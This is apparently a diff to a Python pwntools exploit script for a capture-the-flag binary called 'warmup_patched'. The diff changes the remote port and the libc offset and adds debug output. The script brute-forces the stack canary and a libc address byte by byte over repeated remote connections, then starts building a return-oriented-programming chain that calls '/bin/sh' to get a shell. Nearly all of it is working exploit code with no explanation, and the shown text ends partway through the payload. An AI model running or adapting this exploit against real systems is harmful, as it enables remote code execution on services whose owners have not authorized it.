@@ -2,7 +2,7 @@
 
 from pwn import *
 HOST = "34.76.152.107"
-PORT = 8486
+PORT = 8612
 exe = ELF('warmup_patched', checksec=False)
 libc = ELF('libc.so.6', checksec=False)
 context.terminal = ["tmux", "splitw", "-h"]
@@ -51,9 +51,8 @@ for i in range (8):
             break
         p.close()
 
-# canary = [0, 147, 254, 204, 255, 245, 15, 77]
 payload = b"a" * 56 + b"".join([p8(x) for x in canary]) + p64(0x123)
-libc_leak = [0x76]
+libc_leak = [0x89]
 for i in range(8):
     for j in range(0, 0x100):
         while(True):
@@ -66,20 +65,23 @@ for i in range(8):
                 continue
         s(payload + b"".join([p8(x) for x in libc_leak]) + p8(j))
         data = p.recvrepeat(timeout=10)
+        info("" + str(j))
         if b"This is helper for you" in data:
             libc_leak.append(j)
             info(f"Libc: {libc_leak}")
             p.close()
             break
         p.close()
+        
 p = remote(HOST, PORT, timeout=5)
-
-# libc_leak = [118, 154, 141, 41, 189, 127, 0, 0, 0]
+print(canary)
+print(libc_leak)
 libc_leak = libc_leak[::-1]
 libc_leak = "0x" + "".join(hex(x)[2:] for x in libc_leak)
 libc_leak = int(libc_leak, 16)
-libc.address = libc_leak - 0x23a76
-info("libc leak: " + hex(libc.address))
+libc.address = libc_leak - 0x23a89
+info("libc base: " + hex(libc.address))
+info("leak" + hex(libc_leak))
 pop_rdi = libc.address + 0x00000000000240e5
 payload += flat(
     pop_rdi, next(libc.search(b'/bin/sh')),
